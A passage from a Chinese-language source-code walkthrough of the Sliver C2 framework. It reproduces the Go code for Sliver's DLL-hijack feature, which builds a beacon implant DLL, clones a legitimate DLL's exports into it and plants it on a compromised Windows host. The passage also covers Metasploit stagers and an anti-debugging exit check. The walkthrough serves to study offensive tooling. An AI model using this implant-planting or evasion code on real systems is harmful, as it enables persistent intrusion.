   return nil 
  }, 
  Args: func(a *grumble.Args) { 
   a.String("target-path", "Path to upload the DLL to on the remote system") 
  }, 
  Flags: func(f *grumble.Flags) { 
   f.String("r", "reference-path", "", "Path to the reference DLL on the remote system") 
   f.String("R", "reference-file", "", "Path to the reference DLL on the local system") 
   f.String("f", "file", "", "Local path to the DLL to plant for the hijack") 
   f.String("p", "profile", "", "Profile name to use as a base DLL") 
   f.Int("t", "timeout", defaultTimeout, "command timeout in seconds") 
  }, 
 } 
 con.App.AddCommand(dllhijackCmd)
处理⽅法在这⾥ dllhijack.DllHijackCmd 
路径在client/command/dllhijack/dllhijack.go#36
函数上⾯注释写了 使⽤⽅法
这⾥主要做的是 读取参数和dll 向server端发起数据让server端处理
sliver 简单使⽤及源码浅析
28
// dllhijack --ref-path c:\windows\system32\msasn1.dll --file /tmp/runner.dll TARGET_PATH 
// dllhijack --ref-path c:\windows\system32\msasn1.dll --profile dll  TARGET_PATH 
// dllhijack --ref-path c:\windows\system32\msasn1.dll --ref-file /tmp/ref.dll --profile dll  TARGET_PATH 
// DllHijackCmd -- implements the dllhijack command 
func DllHijackCmd(ctx *grumble.Context, con *console.SliverConsoleClient) { 
 var ( 
  localRefData  []byte 
  targetDLLData []byte 
  err           error 
 ) 
 session := con.ActiveTarget.GetSessionInteractive() 
 if session == nil { 
  return 
 } 
 targetPath := ctx.Args.String("target-path") 
 referencePath := ctx.Flags.String("reference-path") 
 localFile := ctx.Flags.String("file") 
 profileName := ctx.Flags.String("profile") 
 localReferenceFilePath := ctx.Flags.String("reference-file") 
 if referencePath == "" { 
  con.PrintErrorf("Please provide a path to the reference DLL on the target system\n") 
  return 
 } 
 if localReferenceFilePath != "" { 
  localRefData, err = ioutil.ReadFile(localReferenceFilePath) 
  if err != nil { 
   con.PrintErrorf("Could not load the reference file from the client: %s\n", err) 
   return 
  } 
 } 
 if localFile != "" { 
  if profileName != "" { 
   con.PrintErrorf("please use either --profile or --File") 
   return 
  } 
  targetDLLData, err = ioutil.ReadFile(localFile) 
  if err != nil { 
   con.PrintErrorf("Error: %s\n", err) 
   return 
  } 
 } 
 ctrl := make(chan bool) 
 msg := fmt.Sprintf("Crafting and planting DLL at %s ...", targetPath) 
 con.SpinUntil(msg, ctrl) 
 _, err = con.Rpc.HijackDLL(context.Background(), &clientpb.DllHijackReq{ 
  ReferenceDLLPath: referencePath, 
  TargetLocation:   targetPath, 
  ReferenceDLL:     localRefData, 
  TargetDLL:        targetDLLData, 
  Request:          con.ActiveTarget.Request(ctx), 
  ProfileName:      profileName, 
 }) 
 ctrl <- true 
 <-ctrl 
 if err != nil { 
  con.PrintErrorf("Error: %s\n", err) 
  return 
 } 
 con.PrintInfof("DLL uploaded to %s\n", targetPath) 
}
server dll hijack的代码在 server/rpc/rpc-hijack.go
w8ay师傅在知识星球⾥也发了从sliver中提取出来的代理DLL⾃动⽣成，构建转发导出表 go代码
地址是这个 https://articles.zsxq.com/id_maj3olotig6d.html
1. 先初始响应数据 当前会话id 并且判断⽬标是否是windows的 只有windows有dll
sliver 简单使⽤及源码浅析
29
2. 如果请求中没有DLL数据，那么就从受控机下载 DLL回来，否则使⽤客户端发的DLL
3. 通过调⽤ generate.SliverSharedLibrary ⽣成beacon DLL 
4. 通过调⽤ cloneExports⽅法将 正常的DLL的导出表克隆到 3 ⽣成的 beacon DLL中
5. 将最后的dll返回给客户端
其中 cloneExports⽅法是核⼼处理⽅法  代码路径在 server/rpc/rpc-hijack.go#252 
// HijackDLL - RPC call to automatically perform DLL hijacking attacks 
func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*clientpb.DllHijack, error) { 
 var ( 
  refDLL        []byte 
  targetDLLData []byte 
 ) 
 resp := &clientpb.DllHijack{ 
  Response: &commonpb.Response{}, 
 } 
 session := core.Sessions.Get(req.Request.SessionID) 
 if session == nil { 
  return resp, ErrInvalidSessionID 
 } 
 if session.OS != "windows" { 
  return nil, status.Error(codes.InvalidArgument, fmt.Sprintf( 
   "this feature is not supported on the target operating system (%s)", session.OS, 
  )) 
 } 
 // download reference DLL if we don't have one in the request 
 if len(req.ReferenceDLL) == 0 { 
  download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{ 
   Request: &commonpb.Request{ 
    SessionID: session.ID, 
    Timeout:   int64(30), 
   }, 
   Path: req.ReferenceDLLPath, 
  }) 
  if err != nil { 
   return nil, status.Error(codes.InvalidArgument, fmt.Sprintf( 
    "could not download the reference DLL: %s", err.Error(), 
   )) 
  } 
  if download.Encoder == "gzip" { 
   download.Data, err = new(encoders.Gzip).Decode(download.Data) 
   if err != nil { 
    return nil, err 
   } 
  } 
  refDLL = download.Data 
 } else { 
  refDLL = req.ReferenceDLL 
 } 
 if req.ProfileName != "" { 
  profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{}) 
  if err != nil { 
   return nil, err 
  } 
  var p *clientpb.ImplantProfile 
  for _, prof := range profiles.Profiles { 
   if prof.Name == req.ProfileName { 
    p = prof 
   } 
  } 
  if p.GetName() == "" { 
   return nil, status.Error(codes.InvalidArgument, fmt.Sprintf( 
    "no profile found for name %s", req.ProfileName, 
   )) 
  } 
  if p.Config.Format != clientpb.OutputFormat_SHARED_LIB { 
   return nil, status.Error(codes.InvalidArgument, 
    "please select a profile targeting a shared library format", 
   ) 
  } 
  name, config := generate.ImplantConfigFromProtobuf(p.Config) 
  if name == "" { 
sliver 简单使⽤及源码浅析
30
   name, err = generate.GetCodename() 
   if err != nil { 
    return nil, err 
   } 
  } 
  fPath, err := generate.SliverSharedLibrary(name, config) 
  if err != nil { 
   return nil, err 
  } 
  targetDLLData, err = ioutil.ReadFile(fPath) 
  if err != nil { 
   return nil, err 
  } 
 } else { 
  if len(req.TargetDLL) == 0 { 
   return nil, errors.New("missing target DLL") 
  } 
  targetDLLData = req.TargetDLL 
 } 
 // call clone 
 result, err := cloneExports(targetDLLData, refDLL, req.ReferenceDLLPath) 
 if err != nil { 
  return resp, fmt.Errorf("failed to clone exports: %s", err) 
 } 
 targetBytes, err := result.Bytes() 
 if err != nil { 
  return resp, fmt.Errorf("failed to convert PE to bytes: %s", err) 
 } 
 // upload new dll 
 uploadGzip := new(encoders.Gzip).Encode(targetBytes) 
 // upload to remote target 
 upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{ 
  Encoder: "gzip", 
  Data:    uploadGzip, 
  Path:    req.TargetLocation, 
  Request: &commonpb.Request{ 
   SessionID: session.ID, 
   Timeout:   int64(minTimeout), 
  }, 
 }) 
 if err != nil { 
  return nil, err 
 } 
 if upload.Response != nil && upload.Response.Err != "" { 
  return nil, fmt.Errorf(upload.Response.Err) 
 } 
 return resp, nil 
}
分阶段与⽆阶段的stager有啥区别
sliver源码上说⽀持分阶段和⽆阶段
默认是⽆阶段的
stager Generate a stager using Metasploit (requires local Metasploit installation)
stager 使⽤ Metasploit ⽣成 stager（需要本地安装 Metasploit）
也就是说需要使⽤msf来⽣成分阶段的shellcode
可以 help generate 查看
sliver 简单使⽤及源码浅析
31
⼀些可以抄的代码
获取根程序⽬录
先从环境变量获取没有的话就⽤当前⽤户⽬录下创建⼀个 .程序⽬录
func GetRootAppDir() string { 
 value := os.Getenv(envVarName) 
 var dir string 
 if len(value) == 0 { 
  user, _ := user.Current() 
  dir = path.Join(user.HomeDir, ".sliver") 
 } else { 
  dir = value 
 } 
 if _, err := os.Stat(dir); os.IsNotExist(err) { 
  err = os.MkdirAll(dir, 0700) 
  if err != nil { 
   setupLog.Fatalf("Cannot write to sliver root dir %s", err) 
  } 
 } 
 return dir 
}
单独给⼀个 cmd.exec设置环境变量
cmd := exec.Command(garbleBinPath, command...) 
cmd.Dir = cwd 
cmd.Env = []string{ 
  fmt.Sprintf("CC=%s", config.CC), 
  fmt.Sprintf("CGO_ENABLED=%s", config.CGO), 
  fmt.Sprintf("GOOS=%s", config.GOOS), 
  fmt.Sprintf("GOARCH=%s", config.GOARCH), 
  fmt.Sprintf("GOPATH=%s", config.ProjectDir), 
  fmt.Sprintf("GOCACHE=%s", config.GOCACHE), 
  fmt.Sprintf("GOMODCACHE=%s", config.GOMODCACHE), 
  fmt.Sprintf("GOPROXY=%s", config.GOPROXY), 
sliver 简单使⽤及源码浅析
32
  fmt.Sprintf("GARBLE_MAX_LITERAL_SIZE=%s", garbleMaxLiteralSize()), 
  fmt.Sprintf("HTTP_PROXY=%s", config.HTTPPROXY), 
  fmt.Sprintf("HTTPS_PROXY=%s", config.HTTPSPROXY), 
  fmt.Sprintf("PATH=%s:%s", filepath.Join(config.GOROOT, "bin"), os.Getenv("PATH")), 
  fmt.Sprintf("GOGARBLE=%s", config.GOGARBLE), 
 } 
var stdout bytes.Buffer 
var stderr bytes.Buffer 
cmd.Stdout = &stdout 
cmd.Stderr = &stderr
go原⽣log设置输出格式
在  sliver 的stager上的⽇志输出开始使⽤了 log.SetFlags(log.LstdFlags | log.Lshortfile) 这样的定义
具体的含义是控制⽇志输出格式
const ( 
 Ldate         = 1 << iota     //⽇期⽰例： 2009/01/23 
 Ltime                         //时间⽰例: 01:23:23 
 Lmicroseconds                 //毫秒⽰例: 01:23:23.123123. 
 Llongfile                     //绝对路径和⾏号: /a/b/c/d.go:23 
 Lshortfile                    //⽂件和⾏号: d.go:23. 
 LUTC                          //⽇期时间转为0时区的 
 LstdFlags     = Ldate | Ltime //Go提供的标准抬头信息 
)
原⽣的log还可以设置开头如
func init(){ 
 log.SetPrefix("【UserCenter】") 
 log.SetFlags(log.LstdFlags | log.Lshortfile ) 
}
判断程序是否被调试
func PlatformLimits() { 
 kernel32 := syscall.MustLoadDLL("kernel32.dll") 
 isDebuggerPresent := kernel32.MustFindProc("IsDebuggerPresent") 
 var nargs uintptr = 0 
 ret, _, _ := isDebuggerPresent.Call(nargs) 
 // {{if .Config.Debug}} 
 log.Printf("IsDebuggerPresent = %#v\n", int32(ret)) 
 // {{end}} 
 if int32(ret) != 0 { 
  os.Exit(1) 
 } 
}
go模板的使⽤
 类似 jianjia的语法 可以结合注释使⽤ 可以⽤来⽣成⼀些⽂件代码 例如go html等 就不需要拼接了 可以参考
sliver 简单使⽤及源码浅析
33
https://blog.csdn.net/guyan0319/article/details/89083721
go fallthrough
switch case 中使⽤ 默认每个case都有break 当匹配直接break 加了 fallthrough 会强制执⾏后⾯的⼀个case代码 只针对后⾯的⼀个 在
sliver中就是 http 和https 的匹配 即先⽤https的case fallthrough 然后再下⼀个是http
简单的⽣成随机字符串的⽅式
// GenerateOperatorToken - Generate a new operator auth token 
func GenerateOperatorToken() string { 
 buf := make([]byte, 32) 
 n, err := rand.Read(buf) 
 if err != nil || n != len(buf) { 
  panic(errors.New("failed to read from secure rand")) 
 } 
 return hex.EncodeToString(buf) 
}
我的更多的源码分析可以在这⾥看到
https://github.com/Ciyfly/Source_code_learning